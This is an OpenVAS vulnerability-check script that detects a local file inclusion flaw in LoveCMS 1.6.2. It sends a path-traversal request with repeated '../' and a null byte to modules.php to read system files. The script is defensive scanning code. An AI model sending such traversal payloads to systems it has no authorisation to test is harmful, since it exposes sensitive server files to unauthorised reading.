###############################################################################
# OpenVAS Vulnerability Test
# $Id: gb_lcms_45577.nasl 3117 2016-04-19 10:19:37Z benallard $
#
# LoveCMS 'modules.php' Multiple Local File Include Vulnerabilities
#
# Authors:
# Michael Meyer <michael.meyer@greenbone.net>
#
# Copyright:
# Copyright (c) 2011 Greenbone Networks GmbH
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2
# (or any later version), as published by the Free Software Foundation.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

tag_summary = "LoveCMS is prone to multiple local file-include vulnerabilities
because it fails to properly sanitize user-supplied input.

An attacker can exploit these issues to obtain potentially sensitive
information and execute arbitrary local scripts in the context of the
webserver process. This may allow the attacker to compromise the
application and the computer; other attacks are also possible.

LoveCMS 1.6.2 is vulnerable; other versions may also be affected.";


if (description)
{
 script_id(103017);
 script_version("$Revision: 3117 $");
 script_tag(name:"last_modification", value:"$Date: 2016-04-19 12:19:37 +0200 (Tue, 19 Apr 2016) $");
 script_tag(name:"creation_date", value:"2011-01-07 13:52:38 +0100 (Fri, 07 Jan 2011)");
 script_bugtraq_id(45577);
 script_tag(name:"cvss_base", value:"5.1");
 script_tag(name:"cvss_base_vector", value:"AV:N/AC:H/Au:N/C:P/I:P/A:P");
 script_name("LoveCMS 'modules.php' Multiple Local File Include Vulnerabilities");

 script_xref(name : "URL" , value : "https://www.securityfocus.com/bid/45577");
 script_xref(name : "URL" , value : "http://www.sourceforge.net/project/showfiles.php?group_id=168535");
 script_xref(name : "URL" , value : "http://www.lovecms.org/");

 script_tag(name:"qod_type", value:"remote_vul");
 script_summary("Determine if installed LoveCMS is vulnerable");
 script_category(ACT_ATTACK);
 script_family("Web application abuses");
 script_copyright("This script is Copyright (C) 2011 Greenbone Networks GmbH");
 script_dependencies("find_service.nasl","http_version.nasl");
 script_require_ports("Services/www", 80);
 script_exclude_keys("Settings/disable_cgi_scanning");
 script_tag(name : "summary" , value : tag_summary);
 exit(0);
}

include("http_func.inc");
include("host_details.inc");
include("http_keepalive.inc");
include("global_settings.inc");
   
port = get_http_port(default:80);
if(!get_port_state(port))exit(0);
if(!can_host_php(port:port))exit(0);

files = traversal_files();
dirs = make_list("/cms","/lovecms",cgi_dirs());

foreach dir (dirs) {

  foreach file (keys(files)) {
   
    url = string(dir,"/system/admin/modules.php?install=",crap(data:"../",length:3*9),files[file],"%00"); 

    if(http_vuln_check(port:port, url:url,pattern:file)) {
     
      security_message(port:port);
      exit(0);

    }
  }
}
exit(0);
